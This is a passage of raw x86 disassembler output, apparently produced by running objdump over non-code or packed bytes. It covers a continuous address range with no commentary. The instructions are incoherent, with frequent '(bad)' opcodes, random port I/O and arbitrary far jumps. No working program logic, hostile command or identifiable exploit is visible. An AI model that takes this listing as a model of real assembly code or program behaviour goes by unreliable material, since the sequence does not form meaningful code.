  489df4:	xor    DWORD PTR [edi+edx*4+0x63],ecx
  489df8:	adc    esp,eax
  489dfa:	pop    ecx
  489dfb:	ds lock xchg edi,eax
  489dfe:	fcom   DWORD PTR [edx+edx*4-0x6e15a4ed]
  489e05:	cmp    BYTE PTR [edx],0x99
  489e08:	inc    ecx
  489e09:	xlat   BYTE PTR ds:[ebx]
  489e0a:	in     al,dx
  489e0b:	push   0xffffff8a
  489e0d:	xchg   ebx,eax
  489e0e:	pop    ebx
  489e0f:	popf   
  489e10:	sbb    DWORD PTR [eax],ebp
  489e12:	daa    
  489e13:	lods   eax,DWORD PTR ds:[esi]
  489e14:	add    DWORD PTR [edi-0x5bbc3b6c],edx
  489e1a:	xor    DWORD PTR [edx-0x7fc8a750],eax
  489e20:	push   ds
  489e21:	call   0x60b68a56
  489e26:	jnp    0x489e61
  489e28:	add    al,0xea
  489e2a:	shl    BYTE PTR [edx-0x30],0xb1
  489e2e:	retf   
  489e2f:	jmp    0x852f:0x46af02
  489e36:	dec    ecx
  489e37:	pop    ds
  489e38:	and    eax,0x79b1272e
  489e3d:	inc    ebx
  489e3e:	cli    
  489e3f:	jmp    0x489e7b
  489e41:	retf   0x2089
  489e44:	push   ecx
  489e45:	xchg   ebp,eax
  489e46:	popa   
  489e47:	idiv   BYTE PTR [esi-0x10]
  489e4a:	fbld   TBYTE PTR [ebx+0x122c7455]
  489e50:	pop    ss
  489e51:	dec    esi
  489e52:	jo     0x489eb9
  489e54:	push   cs
  489e55:	jmp    0x7548:0xf049efa8
  489e5c:	dec    ebx
  489e5d:	dec    ecx
  489e5e:	fimul  WORD PTR [ebp+0x75011684]
  489e64:	inc    ebp
  489e65:	dec    eax
  489e66:	cmp    BYTE PTR [edx-0x11],ah
  489e69:	mov    edx,0x8a26ee90
  489e6e:	out    dx,al
  489e6f:	or     BYTE PTR [ebp-0x11],al
  489e72:	xchg   ebx,eax
  489e73:	add    dl,al
  489e75:	daa    
  489e76:	adc    al,0x2e
  489e78:	dec    eax
  489e79:	je     0x489e53
  489e7b:	push   cs
  489e7c:	jle    0x489ef9
  489e7e:	or     DWORD PTR gs:[edi+0x31],eax
  489e82:	lock lock or ah,ah
  489e86:	xchg   ebp,eax
  489e87:	fucomp st(3)
  489e89:	in     al,0xeb
  489e8b:	xchg   BYTE PTR ds:0x1e308af,dl
  489e91:	in     al,dx
  489e92:	test   DWORD PTR [ebx-0x1c],ebp
  489e95:	adc    DWORD PTR [eax-0x54],eax
  489e98:	stos   DWORD PTR es:[edi],eax
  489e99:	jl     0x489eb5
  489e9b:	or     BYTE PTR [eax],cl
  489e9d:	lods   eax,DWORD PTR ds:[esi]
  489e9e:	pop    edi
  489e9f:	lock xlat BYTE PTR ds:[ebx]
  489ea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489ea2:	push   esi
  489ea3:	or     DWORD PTR [ebp+0x6c47c7cc],edx
  489ea9:	add    ebx,DWORD PTR [esi-0x30]
  489eac:	sub    DWORD PTR [ebx-0x20],esi
  489eaf:	mov    ebx,edx
  489eb1:	xor    DWORD PTR [edi],ebp
  489eb3:	mov    dl,0x1f
  489eb5:	ror    DWORD PTR [eax],0xf8
  489eb8:	add    ecx,DWORD PTR [edx-0x1c7fdbe4]
  489ebe:	push   ebx
  489ec0:	cmp    eax,0xb628aa84
  489ec5:	mov    BYTE PTR ds:0x5b8d170c,ah
  489ecb:	jp     0x489e62
  489ecd:	(bad)  
  489ece:	xor    bh,ch
  489ed0:	or     edx,edi
  489ed2:	adc    dh,bh
  489ed4:	cmp    bl,0x49
  489ed7:	jne    0x489eeb
  489ed9:	into   
  489eda:	dec    esp
  489edb:	cmp    BYTE PTR [ebx],dh
  489edd:	pop    edi
  489ede:	popa   
  489edf:	sub    eax,0x1560da03
  489ee4:	xlat   BYTE PTR ds:[ebx]
  489ee5:	int3   
  489ee6:	mov    edx,0xd9093030
  489eeb:	sbb    ebx,DWORD PTR [edi-0x9f9cd3b]
  489ef1:	int3   
  489ef2:	push   eax
  489ef3:	sbb    edx,esp
  489ef5:	pop    ss
  489ef6:	sar    DWORD PTR [eax],cl
  489ef8:	add    eax,0xee385723
  489efd:	retf   0xc3f
  489f00:	sahf   
  489f01:	cmp    edi,DWORD PTR [eax-0x5b4c1210]
  489f07:	mov    ds:0x44be3223,eax
  489f0c:	mov    ebp,0x72522f81
  489f11:	stc    
  489f12:	inc    esi
  489f13:	mov    ds:0xd9ee4003,al
  489f18:	clc    
  489f19:	test   edi,edi
  489f1b:	push   0x10be5a71
  489f20:	out    dx,al
  489f21:	inc    ebx
  489f22:	add    BYTE PTR [edi+0x34],dl
  489f25:	pop    ebx
  489f26:	into   
  489f27:	enter  0x4646,0xa2
  489f2b:	inc    ebp
  489f2c:	imul   ebx,edx,0x4301f1ed
  489f32:	outs   dx,BYTE PTR ds:[esi]
  489f33:	dec    ebp
  489f34:	jno    0x489f1d
  489f36:	fimul  WORD PTR [eax+0x16a5743]
  489f3c:	or     edi,edi
  489f3e:	adc    eax,0xb02a2e3b
  489f43:	mov    BYTE PTR [esi+0x4f20d44c],al
  489f49:	in     eax,dx
  489f4a:	sbb    dh,BYTE PTR [ecx+0x6f33ebf6]
  489f50:	ja     0x489fba
  489f52:	push   0x2d404375
  489f57:	nop
  489f58:	pop    ss
  489f59:	addr16 loope 0x489f64
  489f5c:	or     al,0xb1
  489f5e:	xchg   edx,eax
  489f5f:	in     eax,dx
  489f60:	pushf  
  489f61:	and    BYTE PTR [eax+edx*1+0x631f8f31],dh
  489f68:	fwait
  489f69:	sbb    BYTE PTR [esi],al
  489f6b:	xor    eax,0xe16bdf5f
  489f70:	pop    ds
  489f71:	mov    BYTE PTR [edx-0x1],al
  489f74:	inc    eax
  489f75:	pop    esp
  489f76:	ret    
  489f77:	push   esi
  489f78:	push   eax
  489f79:	retf   
  489f7a:	ss inc edx
  489f7c:	(bad)  
  489f7d:	jle    0x489f82
  489f7f:	dec    DWORD PTR [eax+0x5c]
  489f82:	cmp    BYTE PTR [eax+0x58],0xea
  489f86:	mov    BYTE PTR [eax+0xa],0xa4
  489f8a:	test   ecx,eax
  489f8c:	inc    ebp
  489f8d:	addr16 add ah,ah
  489f90:	xchg   ebx,eax
  489f91:	imul   edx,DWORD PTR [edi-0x732afcfc],0x65809af2
  489f9b:	add    al,0x5f
  489f9d:	mov    ecx,0x9790b9ee
  489fa2:	sbb    al,0x28
  489fa4:	shr    dh,0x28
  489fa7:	fsub   QWORD PTR [eax+0x18c3f881]
  489fad:	out    dx,eax
  489fae:	idiv   DWORD PTR [esi]
  489fb0:	and    BYTE PTR ds:0xb70f4db1,al
  489fb6:	dec    ebp
  489fb7:	sub    al,0xd
  489fb9:	sbb    cl,BYTE PTR [edi+0x2ea24ce8]
  489fbf:	outs   dx,BYTE PTR ds:[esi]
  489fc0:	(bad)  
  489fc1:	and    DWORD PTR [edx-0x69],eax
  489fc4:	test   eax,0x6be0524a
  489fc9:	sbb    edi,DWORD PTR ds:0x240f3a89
  489fcf:	out    dx,eax
  489fd0:	inc    ebx
  489fd1:	(bad)  
  489fd2:	pop    es
  489fd3:	sub    edi,esi
  489fd5:	jge    0x489f76
  489fd7:	or     al,0x37
  489fd9:	or     cl,BYTE PTR [esi]
  489fdb:	popa   
  489fdc:	jb     0x489ff3
  489fde:	add    eax,0xdf2c0461
  489fe3:	xchg   DWORD PTR [esi+0x68],esi
  489fe6:	jle    0x489ff0
  489fe8:	adc    BYTE PTR [ecx-0x4e0adb04],al
  489fee:	push   ebx
  489fef:	add    edi,DWORD PTR [edi+0x97789b0]
  489ff5:	push   ebp
  489ff6:	add    BYTE PTR [eax],al
  489ff8:	pop    es
  489ff9:	push   edx
  489ffa:	gs lock loopne 0x48a01e
  489ffe:	cmc    
  489fff:	bound  esi,QWORD PTR [ebp+0x69]
  48a002:	ins    BYTE PTR es:[edi],dx
  48a003:	lods   eax,DWORD PTR ds:[esi]
  48a004:	cmp    al,0xf3
  48a006:	and    dh,BYTE PTR [eax+0xece6f74]
  48a00c:	shr    BYTE PTR [edi-0x1adb5fee],0x5e
  48a013:	sbb    al,0x61
  48a015:	jmp    0x489fe3
  48a017:	cs dec ebp
  48a019:	mov    ebp,0x209d4107
  48a01e:	punpcklbw mm4,DWORD PTR [ebx+0x24]
  48a022:	cmc    
  48a023:	adc    BYTE PTR ds:0x26885941,al
  48a029:	push   edx
  48a02a:	pop    ss
  48a02b:	adc    al,BYTE PTR [edi+0x35]
  48a02e:	div    bh
  48a030:	and    DWORD PTR [edi],esp
  48a032:	fs mov edx,0xd6f02c90
  48a038:	sbb    dl,BYTE PTR [ecx+eax*2+0x64]
  48a03c:	js     0x48a064
  48a03e:	xchg   ebp,eax
  48a03f:	stos   BYTE PTR es:[edi],al
  48a040:	fldcw  WORD PTR [esi+0x63]
  48a043:	push   eax
  48a044:	out    0x2d,eax
  48a046:	add    cl,BYTE PTR [ebx]
  48a048:	cmp    cl,bh
  48a04a:	and    edx,DWORD PTR [esi-0xe7c3e99]
  48a050:	call   0xf0ed66b8
  48a055:	adc    eax,0xccb41cc4
  48a05a:	push   es
  48a05b:	xchg   dh,al
  48a05d:	in     eax,0x1d
  48a05f:	mov    WORD PTR [esi+ecx*1+0x60d0501],fs
  48a066:	push   edx
  48a067:	xchg   edi,eax
  48a068:	sbb    cl,BYTE PTR [ecx+0x7]
  48a06b:	fisub  DWORD PTR [ebx-0xbd4748]
  48a071:	icebp  
  48a072:	(bad)  
  48a073:	adc    DWORD PTR [ecx],eax
  48a075:	inc    esi
  48a076:	push   ecx
  48a077:	dec    ebx
  48a078:	push   ebx
  48a079:	inc    esp
  48a07a:	push   0x29
  48a07c:	sar    DWORD PTR [ebx],cl
  48a07e:	mov    ah,BYTE PTR [edi-0x1b]
  48a081:	adc    BYTE PTR [esi],bh
  48a083:	or     eax,DWORD PTR [esi-0x5b]
  48a086:	sub    DWORD PTR [ebx],ebx
  48a088:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48a089:	jne    0x48a095
  48a08b:	lahf   
  48a08c:	lds    esi,FWORD PTR [ebp-0x24ef23ff]
  48a092:	in     eax,dx
  48a093:	in     al,0x60
  48a095:	dec    ebx
  48a096:	aaa    
  48a097:	pop    esp
  48a098:	(bad)  
  48a099:	or     eax,0xd4d90187
  48a09e:	imul   ebx,ecx,0x1eccde4b
  48a0a4:	add    bh,cl
  48a0a6:	mov    cl,BYTE PTR [edi-0x3fbc0db8]
  48a0ac:	add    eax,DWORD PTR [eax+edx*4+0x2b]
  48a0b0:	mul    DWORD PTR [edx]
  48a0b2:	pop    edi
  48a0b3:	fadd   DWORD PTR ds:0x44072044
  48a0b9:	sar    DWORD PTR [edi+ebp*4+0x1d],cl
  48a0bd:	add    al,0x4
  48a0bf:	push   ds
  48a0c0:	cmp    al,0x6
  48a0c2:	ins    BYTE PTR es:[edi],dx
  48a0c3:	push   cs
  48a0c4:	add    BYTE PTR ds:0xbee7bc9c,al
  48a0ca:	mov    BYTE PTR [esi-0x34],bl
  48a0cd:	das    
  48a0ce:	push   ds
  48a0cf:	jo     0x48a0d7
  48a0d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48a0d2:	jno    0x48a072
  48a0d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a0d5:	stc    
  48a0d6:	add    BYTE PTR [esi],al
  48a0d8:	and    BYTE PTR [eax+0x60],al
  48a0db:	out    dx,eax
  48a0dc:	or     eax,0x805e17f2
  48a0e1:	push   es
  48a0e2:	inc    esp
  48a0e3:	pushf  
  48a0e4:	push   ss
  48a0e5:	rol    BYTE PTR [esi],0xe0
  48a0e8:	adc    DWORD PTR [edi],eax
  48a0ea:	out    dx,eax
  48a0eb:	cmp    eax,0xeedcc600
  48a0f0:	pmullw mm7,QWORD PTR [ecx]
  48a0f3:	add    al,cl
  48a0f5:	jno    0x48a166
  48a0f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48a0f8:	outs   dx,BYTE PTR ds:[esi]
  48a0f9:	xchg   esp,ebp
  48a0fb:	add    al,0xde
  48a0fd:	fwait
  48a0fe:	test   BYTE PTR [eax-0xd],0x1f
  48a102:	push   es
  48a103:	push   ss
  48a104:	xor    al,BYTE PTR [esi]
  48a106:	lods   al,BYTE PTR ds:[esi]
  48a107:	push   ebx
  48a108:	lock fwait
  48a10a:	jmp    0x4430:0x94bec837
  48a111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48a112:	or     eax,0x679b8138
  48a117:	push   esp
  48a118:	inc    edi
  48a119:	or     al,0xc
  48a11b:	xor    DWORD PTR [edi+esi*1-0x27],eax
  48a11f:	ins    BYTE PTR es:[edi],dx
  48a120:	or     eax,0x221f4c86
  48a125:	push   es
  48a126:	sub    al,0x10
  48a128:	mov    WORD PTR [eax+ecx*2],fs
  48a12b:	jmp    0x29b4:0x2bf8b366
  48a132:	in     al,dx
  48a133:	sub    al,BYTE PTR [ebp+esi*1+0xd]
  48a137:	mov    BYTE PTR [edi+edx*2+0x30],0x67
  48a13c:	pop    es
  48a13d:	jecxz  0x48a0da
  48a13f:	lock and dl,bh
  48a142:	push   0xfffffff8
  48a144:	jnp    0x48a0e0
  48a146:	ins    DWORD PTR es:[edi],dx
  48a147:	pop    es
  48a148:	jae    0x48a17a
  48a14a:	cs jb  0x48a17d
  48a14d:	sub    BYTE PTR [eax],al
  48a14f:	cmp    BYTE PTR [esi],al
  48a151:	dec    eax
  48a152:	xchg   ebp,eax
  48a153:	jmp    0x9a764246
  48a158:	pop    es
  48a159:	cmp    ecx,DWORD PTR es:[ecx]
  48a15c:	sbb    BYTE PTR [ebp+esi*1-0x1ae2f859],ah
  48a163:	pop    ss
  48a164:	add    al,0x5c
  48a166:	icebp  
  48a167:	cwde   
  48a168:	sbb    BYTE PTR [ecx+0x19345516],bh
  48a16e:	nop
  48a16f:	mov    edi,0x442820
  48a174:	mov    esp,0x9002442c
  48a179:	xor    al,0xd9
  48a17b:	jmp    0x5978:0xa834a8b5
  48a182:	nop
  48a183:	(bad)  
  48a184:	or     DWORD PTR [ebx+0x5b],ebp
  48a187:	xor    eax,0x5b7afb48
  48a18c:	cmp    edi,DWORD PTR [esi]
  48a18e:	sar    BYTE PTR [eax],0x89
  48a191:	xchg   DWORD PTR [edi+edx*1],eax
  48a194:	cwde   
  48a195:	adc    BYTE PTR [ebx],0xe
  48a198:	inc    edi
  48a199:	hlt    
  48a19a:	imul   esp,DWORD PTR [ebp+0x79],0xfffffff2
  48a19e:	test   BYTE PTR [edx+edi*4+0x73],bh
  48a1a2:	dec    ebx
  48a1a3:	cmp    al,0x3c
  48a1a5:	cmp    al,BYTE PTR ds:0x836f1100
  48a1ab:	test   eax,0x643a2485
  48a1b0:	jne    0x48a19d
  48a1b2:	dec    esp
  48a1b3:	enter  0xc166,0xe8
  48a1b7:	mov    ebp,0x2c2c942c
  48a1bc:	sub    eax,0x7c035f06
  48a1c1:	ret    
  48a1c2:	lea    ebp,[edi+0x26909848]
  48a1c8:	jo     0x48a14a
  48a1ca:	packssdw mm0,QWORD PTR [ecx+0x4d]
  48a1ce:	add    eax,0x9f8082b3
  48a1d3:	idiv   DWORD PTR [ebp+0x3e]
  48a1d6:	mov    al,ds:0x3e442f74
  48a1db:	outs   dx,DWORD PTR ds:[esi]
  48a1dc:	nop
  48a1dd:	loope  0x48a1d6
  48a1df:	or     BYTE PTR [eax],al
  48a1e1:	inc    edx
  48a1e2:	cmp    BYTE PTR [eax],dl
  48a1e4:	daa    
  48a1e5:	or     edi,DWORD PTR [edx]
  48a1e7:	daa    
  48a1e8:	imul   edx,DWORD PTR [eax+eax*1-0x12c1f7f7],0xd8e80547
  48a1f3:	(bad)  
  48a1f4:	jl     0x48a256
  48a1f6:	xor    DWORD PTR [ecx],ecx
  48a1f8:	ret    
  48a1f9:	bound  ecx,QWORD PTR [edx]
  48a1fb:	cwde   
  48a1fc:	or     ch,dh
  48a1fe:	jne    0x48a262
  48a200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a201:	mov    esp,DWORD PTR [edi+0x7314c23b]
  48a207:	xchg   ebx,eax
  48a208:	cmp    bl,BYTE PTR [eax+0xc]
  48a20b:	and    BYTE PTR [edi+0x8],dl
  48a20e:	add    DWORD PTR [edi],edi
  48a210:	or     eax,eax
  48a212:	in     al,0x79
  48a214:	mov    edx,0xb46439d7
  48a219:	jns    0x48a19e
  48a21b:	cmp    al,0x1
  48a21d:	or     BYTE PTR [esp+edx*2],0x86
  48a221:	aas    
  48a222:	add    ecx,DWORD PTR [edx]
  48a224:	pop    eax
  48a225:	repnz fsub QWORD PTR [edi]
  48a228:	cmc    
  48a229:	inc    eax
  48a22a:	xor    BYTE PTR [edx],al
  48a22c:	add    DWORD PTR [ecx-0x35ba888c],0x48546eb1
  48a236:	pop    es
  48a237:	hlt    
  48a238:	or     DWORD PTR [edx+0xe6515d4],0x36e82b6f
  48a242:	sbb    DWORD PTR [ecx],ecx
  48a244:	pop    es
  48a245:	aam    0xf5
  48a247:	shl    al,cl
  48a249:	pop    ss
  48a24a:	test   eax,0xd8208b0f
  48a24f:	jb     0x48a291
  48a251:	dec    eax
  48a252:	add    ebx,ecx
  48a254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48a255:	sub    BYTE PTR [eax+esi*1],dl
  48a258:	cmp    eax,0x78418c1a
  48a25d:	or     eax,0x3d61850a
  48a262:	add    al,0x14
  48a264:	lock js 0x48a26b
  48a267:	retf   0x7ef
  48a26a:	cmp    eax,0x61524f0c
  48a26f:	fs jp  0x48a20b
  48a272:	js     0x48a28e
  48a274:	pusha  
  48a275:	add    al,0xe4
  48a278:	jns    0x48a20a
  48a27a:	ins    BYTE PTR es:[edi],dx
  48a27b:	xor    al,0xd7
  48a27d:	lods   eax,DWORD PTR ds:[esi]
  48a27e:	xor    BYTE PTR [edx-0x63],dh
  48a281:	pop    ss
  48a282:	lea    edi,[esi]
  48a284:	inc    esp
  48a285:	mov    ds:0x809e4c04,eax
  48a28a:	push   esp
  48a28b:	adc    al,0x6c
  48a28d:	fisttp QWORD PTR ds:0x428813c8
  48a293:	pop    es
  48a294:	je     0x48a2d9
  48a296:	xor    eax,ecx
  48a298:	adc    eax,0xbc143e04
  48a29d:	and    DWORD PTR [ebp+0x10],ecx
  48a2a0:	jo     0x48a274
  48a2a2:	nop
  48a2a3:	mov    ds:0xc0bed390,al
  48a2a8:	xor    dl,BYTE PTR ds:0x48f028c1
  48a2ae:	cwde   
  48a2af:	sbb    eax,0x98c85f30
  48a2b4:	push   ss
  48a2b5:	add    BYTE PTR [edx],dl
  48a2b7:	and    eax,DWORD PTR [ebp+0x59b0cf3c]
  48a2bd:	mov    al,ds:0x5357a0a0
  48a2c2:	add    ebx,esi
  48a2c4:	pop    ss
  48a2c5:	add    BYTE PTR ds:0xf6b68d85,cl
  48a2cb:	cdq    
  48a2cc:	mov    dh,0x39
  48a2ce:	pop    ebp
  48a2cf:	daa    
  48a2d0:	add    al,0xf7
  48a2d2:	xor    al,0xf7
  48a2d4:	pop    ds
  48a2d5:	push   ss
  48a2d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a2d7:	mov    edx,0x582ae78c
  48a2dc:	push   edi
  48a2dd:	inc    eax
  48a2de:	cmp    eax,DWORD PTR [edx+0x76]
  48a2e1:	sbb    eax,0x43984490
  48a2e6:	inc    esi
  48a2e7:	xor    al,0x44
  48a2e9:	(bad)  
  48a2ea:	mov    ebp,0x3aa49cd7
  48a2ef:	add    BYTE PTR [esi-0x6c],0x6e
  48a2f3:	mov    al,0xe
  48a2f5:	jns    0x48a334
  48a2f7:	sbb    eax,0xff3c878c
  48a2fc:	pop    ss
  48a2fd:	scas   al,BYTE PTR es:[edi]
  48a2fe:	call   0xa042:0x782675ef
  48a305:	push   es
  48a306:	mov    BYTE PTR [edi],bh
  48a308:	add    eax,0x641abcd1
  48a30d:	or     eax,0x7c150747
  48a312:	fild   WORD PTR [ebx]
  48a314:	mov    dh,0x41
  48a316:	sub    ebx,DWORD PTR [ecx+eax*1-0x6211cbcf]
  48a31d:	jl     0x48a2e0
  48a31f:	loopne 0x48a2cb
  48a321:	fild   WORD PTR ds:0x60bc16e5
  48a327:	bound  edi,QWORD PTR [ebx+0x801c715]
  48a32d:	clc    
  48a32e:	pop    ds
  48a32f:	clc    
  48a330:	xor    al,0x20
  48a332:	in     al,0xe7
  48a334:	out    0x60,al
  48a336:	jl     0x48a32e
  48a338:	inc    ebx
  48a339:	rcr    BYTE PTR [eax+0x16],cl
  48a33c:	inc    eax
  48a33d:	(bad)  
  48a33e:	mov    dh,BYTE PTR [eax+ecx*2-0x7e4f94b8]
  48a345:	fisubr WORD PTR [edi-0x75]
  48a348:	rol    BYTE PTR [edi],0x7
  48a34b:	and    DWORD PTR [ebp-0x4b],edx
  48a34e:	loopne 0x48a385
  48a350:	inc    ebp
  48a351:	xor    BYTE PTR [esi],al
  48a353:	or     ebp,DWORD PTR [edi+0x44858aa]
  48a359:	mov    eax,0x6854b8f7
  48a35e:	fs push es
  48a360:	dec    ebp
  48a361:	nop
  48a362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a363:	or     eax,DWORD PTR [eax*1+0x3484744b]
  48a36a:	pop    edx
  48a36b:	add    eax,0x770504b8
  48a370:	pop    esp
  48a371:	and    DWORD PTR [ecx],eax
  48a373:	not    BYTE PTR cs:[edi+edx*2-0x7ca90efb]
  48a37b:	popf   
  48a37c:	gs mov ebx,0x6b741748
  48a382:	push   es
  48a383:	or     DWORD PTR [eax-0x7c],ebx
  48a386:	inc    edi
  48a387:	sub    al,0x40
  48a389:	inc    esp
  48a38a:	dec    ebx
  48a38b:	jo     0x48a407
  48a38d:	or     eax,0x48890619
  48a392:	xor    edx,DWORD PTR cs:[ecx]
  48a395:	inc    eax
  48a396:	adc    BYTE PTR [ebx+0x26607b07],0xe4
  48a39d:	fwait
  48a39e:	inc    eax
  48a39f:	into   
  48a3a0:	mov    esp,0x79c00842
  48a3a5:	pop    ebp
  48a3a6:	mov    eax,0xce4147f1
  48a3ab:	lock pop ebp
  48a3ad:	enter  0x4375,0x1b
  48a3b1:	or     DWORD PTR [esi+ebp*4+0x2],esp
  48a3b5:	add    BYTE PTR [eax],bh
  48a3b7:	pop    eax
  48a3b8:	add    DWORD PTR [edx],ecx
  48a3ba:	or     ah,BYTE PTR [edi+0x54b3025b]
  48a3c0:	stc    
  48a3c1:	shl    eax,0x32
  48a3c4:	mov    ch,0xee
  48a3c6:	andps  xmm7,XMMWORD PTR [ecx+0x61]
  48a3ca:	std    
  48a3cb:	mov    cs,WORD PTR [esi-0x4f]
  48a3ce:	push   eax
  48a3cf:	cmp    al,BYTE PTR [esi]
  48a3d1:	jo     0x48a434
  48a3d3:	sub    DWORD PTR [eax],ebx
  48a3d5:	xchg   edi,eax
  48a3d6:	cmp    eax,0x7061707d
  48a3db:	or     ebx,ebp
  48a3dd:	enterw 0xd995,0x94
  48a3e2:	inc    edx
  48a3e3:	std    
  48a3e4:	mov    edx,0x54f6df24
  48a3e9:	jb     0x48a44c
  48a3eb:	arpl   WORD PTR [ebx+0x9],bp
  48a3ee:	nop
  48a3ef:	xor    al,0xd
  48a3f1:	je     0x48a455
  48a3f3:	data16 fcmovnu st,st(1)
  48a3f6:	in     al,dx
  48a3f7:	imul   esi,DWORD PTR ds:0x19941a0c,0x7f
  48a3fe:	aam    0xf
  48a400:	pop    ss
  48a401:	nop
  48a402:	retf   
  48a403:	call   DWORD PTR [edi]
  48a405:	ins    DWORD PTR es:[edi],dx
  48a406:	fdiv   DWORD PTR [ebx+0x60]
  48a409:	cwde   
  48a40a:	bnd jl 0x48a392
  48a40d:	add    al,0xd0
  48a40f:	sub    BYTE PTR [esi+0x49],dh
  48a412:	pop    esi
  48a413:	mov    cl,0x1b
  48a415:	ins    DWORD PTR es:[edi],dx
  48a416:	popa   
  48a417:	sbb    dl,BYTE PTR [eax]
  48a419:	fstp   DWORD PTR ds:0x470b293
  48a41f:	or     DWORD PTR [edx],ebx
  48a421:	adc    edi,ecx
  48a423:	(bad)  
  48a424:	mov    al,0x67
  48a426:	and    BYTE PTR [edx],ch
  48a428:	push   es
  48a429:	sbb    dl,al
  48a42b:	int    0x90
  48a42d:	cmp    al,0xfa
  48a42f:	(bad)  
  48a430:	fadd   QWORD PTR [esp+ebp*2+0x10e06ce]
  48a437:	mov    ebp,0x7afaa0c6
  48a43c:	cs ss and esp,esi
  48a440:	pop    ds
  48a441:	in     al,0x78
  48a443:	adc    edx,DWORD PTR [ecx-0x43]
  48a446:	sub    al,bh
  48a448:	enter  0xaf4f,0x54
  48a44c:	mov    ah,dh
  48a44e:	fwait
  48a44f:	nop
  48a450:	dec    edi
  48a451:	cld    
  48a452:	push   ds
  48a453:	mov    ah,0x50
  48a455:	or     bl,BYTE PTR ds:0x41a0d6b0
  48a45b:	push   edi
  48a45c:	nop
  48a45d:	pop    ss
  48a45e:	pop    es
  48a45f:	and    DWORD PTR [eax+0x71],edi
  48a462:	repnz push 0xd10d956
  48a468:	inc    edi
  48a469:	pusha  
  48a46a:	test   DWORD PTR [edx],esp
  48a46c:	and    eax,0xa1602655
  48a471:	sbb    al,0x80
  48a473:	or     al,0x31
  48a475:	and    DWORD PTR [eax*1-0x7e886d23],eax
  48a47c:	popa   
  48a47d:	jmp    0x83a6:0x21060f61
  48a484:	dec    esp
  48a485:	and    DWORD PTR [edi+0x21],ebx
  48a488:	cmp    eax,0x7924238
  48a48d:	mov    BYTE PTR [eax],dl
  48a48f:	in     al,0x18
  48a491:	push   eax
  48a492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48a493:	adc    eax,0x89df1421
  48a498:	ins    DWORD PTR es:[edi],dx
  48a499:	shl    DWORD PTR [eax-0x70],cl
  48a49c:	and    DWORD PTR [ecx],ecx
  48a49e:	cmp    dl,bh
  48a4a0:	push   es
  48a4a1:	imul   ebp,DWORD PTR [eax],0x69c85854
  48a4a7:	cmp    bl,ah
  48a4a9:	push   ebp
  48a4aa:	xor    al,ah
  48a4ac:	xor    al,0xbd
  48a4ae:	or     esp,esp
  48a4b0:	xor    eax,0xbf0cc90a
  48a4b5:	push   0xad5168e8
  48a4ba:	leave  
  48a4bb:	cs or  eax,0x7091d9c
  48a4c1:	adc    eax,0xbd0e0c05
  48a4c6:	jo     0x48a529
  48a4c8:	test   BYTE PTR [ebx],cl
  48a4ca:	jns    0x48a510
  48a4cc:	jo     0x48a4dd
  48a4ce:	in     al,dx
  48a4cf:	inc    ecx
  48a4d0:	xor    edx,DWORD PTR [esi]
  48a4d2:	loopne 0x48a467
  48a4d4:	out    0x44,al
  48a4d6:	std    
  48a4d7:	out    dx,eax
  48a4d8:	push   ecx
  48a4d9:	adc    esp,DWORD PTR [eax]
  48a4db:	fcomp  QWORD PTR [eax+0x3e]
  48a4de:	pop    ss
  48a4df:	dec    esi
  48a4e0:	inc    ebp
  48a4e1:	xor    cl,0x4
  48a4e4:	sub    eax,0x49ccc772
  48a4e9:	mov    ds:0xe738d27d,al
  48a4ee:	xchg   edx,eax
  48a4ef:	nop
  48a4f0:	mov    al,0xd7
  48a4f2:	jb     0x48a4f8
  48a4f4:	or     bh,ah
  48a4f6:	mov    esp,0x3842bc4e
  48a4fb:	xor    DWORD PTR [ecx],edx
  48a4fd:	push   cs
  48a4fe:	cmc    
  48a4ff:	mov    edi,0x5f011c2f
  48a504:	shl    BYTE PTR [esi+ecx*4],1
  48a507:	xor    DWORD PTR [edx],esi
  48a509:	xor    ebp,eax
  48a50b:	dec    DWORD PTR [edx+0x363534ff]
  48a511:	aaa    
  48a512:	cmp    BYTE PTR [ecx],bh
  48a514:	xor    BYTE PTR [ecx+0x42],al
  48a517:	ret    0x4645
  48a51a:	inc    edi
  48a51b:	dec    eax
  48a51c:	dec    ecx
  48a51d:	dec    edx
  48a51e:	dec    ebx
  48a51f:	dec    esp
  48a520:	dec    ebp
  48a521:	dec    esi
  48a522:	dec    edi
  48a523:	add    esp,edi
  48a525:	cmp    ecx,DWORD PTR [ebp-0x20]
  48a528:	push   ebx
  48a529:	push   esp
  48a52a:	push   ebp
  48a52b:	push   esi
  48a52c:	push   edi
  48a52d:	pop    eax
  48a52e:	pop    ecx
  48a52f:	pop    edx
  48a530:	push   esi
  48a531:	dec    eax
  48a532:	sub    DWORD PTR [edi],esi
  48a534:	xchg   ebx,ecx
  48a536:	adc    eax,DWORD PTR [ebp+0x15ba84fa]
  48a53c:	rcl    bh,0x31
  48a53f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48a540:	xor    DWORD PTR [edx],ebp
  48a542:	int    0xc2
  48a544:	inc    edx
  48a545:	es aam 0x22
  48a548:	dec    eax
  48a549:	cdq    
  48a54a:	test   BYTE PTR ds:0x6fa0af95,ah
  48a550:	sub    DWORD PTR [eax],eax
  48a552:	cmp    al,0x19
  48a554:	enter  0x28,0x92
  48a558:	(bad)  
  48a559:	in     eax,0x42
  48a55b:	push   ss
  48a55c:	int3   
  48a55d:	out    dx,al
  48a55e:	inc    ebx
  48a55f:	addr16 mov ds:0xeb88,al
  48a563:	out    dx,eax
  48a564:	push   ecx
  48a565:	shl    DWORD PTR [ebx],0xc0
  48a568:	or     BYTE PTR [edi+eiz*2+0x4a],al
  48a56c:	mov    ebp,0x11751522
  48a571:	jg     0x48a597
  48a573:	test   BYTE PTR [ebp-0x3],0xc6
  48a577:	data16 cli 
  48a579:	and    BYTE PTR [esi+ebp*1],dl
  48a57c:	iret   
  48a57d:	in     eax,0x12
